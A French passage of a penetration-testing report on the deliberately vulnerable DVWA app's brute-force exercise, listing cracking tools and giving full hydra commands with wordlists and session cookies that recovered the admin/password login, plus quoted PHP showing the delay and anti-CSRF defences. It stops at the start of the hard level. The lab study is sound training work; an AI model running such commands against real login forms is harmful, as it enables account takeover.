# 1. Brute Force

Inutile d'expliquer le bruteforce, mais nous allons quand même le faire :).
Le bruteforce  est une méthode d'attaque utilisée pour deviner un mot de passe, une clé de chiffrement ou toute autre information sensible en essayant systématiquement toutes les combinaisons possibles jusqu'à trouver la bonne. C'est une méthode simple mais parfois efficace, surtout si les mots de passe ou clés sont faibles ou mal sécurisés.

Il y a plusieurs outils disponible pour bruteforce : 

| Outil           | Description                                                                  | Cible principale                          |
| --------------- | ---------------------------------------------------------------------------- | ----------------------------------------- |
| Hydra           | Outil rapide pour tester des mots de passe sur divers services réseau.       | SSH, FTP, HTTP, SMTP, etc.                |
| Medusa          | Outil de bruteforce modulaire et rapide pour les services réseau.            | SSH, FTP, Telnet, MySQL, etc              |
| John the Ripper | Craqueur de mots de passe hachés puissant et configurable.                   | Hachages de mots de passe                 |
| Hashcat         | Outil de déchiffrement avancé pour hachages, avec support GPU                | Hachages de mots de passe                 |
| Burp Suite      | Suite d'outils pour les tests de sécurité, incluant un module de bruteforce. | Formulaires web, sessions HTTP            |
| Wfuzz           | Outil flexible pour le bruteforce des paramètres web.                        | URL, cookies, paramètres web              |
| Patator         | Outil modulaire pour tester les mots de passe et autres services.            | SSH, HTTP, DNS, MySQL, etc.               |
| Ncrack          | Outil rapide pour tester la sécurité des authentifications réseau.           | SSH, RDP, FTP, Telnet, etc.               |
| Aircrack-ng     | Outil pour le craquage des clés de réseaux Wi-Fi.                            | Clés WEP/WPA sur Wi-Fi                    |
| CeWL            | Génère des listes de mots (wordlists) basées sur les contenus d'un site      | Création de dictionnaires personnalisés\| |

## 1.1 Premier niveau - low

On arrive sur une simple page de login
![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\bruteforce\1.png)

On remarque en essayant des identifiants que ces derniers sont envoyés via la méthode `GET` car on a cette url.

```
http://dvwa.lan/DVWA/vulnerabilities/brute/?username=admin&password=admin&Login=Login#
```

On va utiliser `hydra` pour essayer de bruteforce.  
La commande n'etant pas très lisible en screenshot, la voici directement :

```
hydra -l admin -P /opt/wordlist/wordlists/wordlists/passwords/most_used_passwords.txt dvwa.lan http-get-form "/DVWA/
vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low:F=Username and/or password incorrect."
```

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\bruteforce\2.png)
On trouve le login qui est `admin` et le password `password`.

## 1.2 Deuxieme niveau - medium

Cette fois ci, on utilise une wordlist aussi pour les identifiants 

```
hydra -L /opt/wordlists/wordlists/languages/english.txt -P /opt/wordlists/wordlists/passwords/password.txt 34.163.97.167 http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=dvkdo50vcgtak32lhhadgk8rvs; security=medium:F=Username and/or password incorrect."
```

Cependant, cela marche toujours puisque le code ne bloque pas les requêtes ou ne les filtre pas non plus il ajoute seulement un délai de 2 secondes entre chaque requêtes

```php
<?php
...
    }
    else {
        // Login failed
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

On le voit dans le code source dans la balise `else`. Donc le programme prendra plus de temps mais ultimement ca ne change rien au bruteforce

# 1.3 Troisieme niveau - hard

Quand on regarde le code source du troisieme niveau on remarque une ligne de code différente

```php
if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```
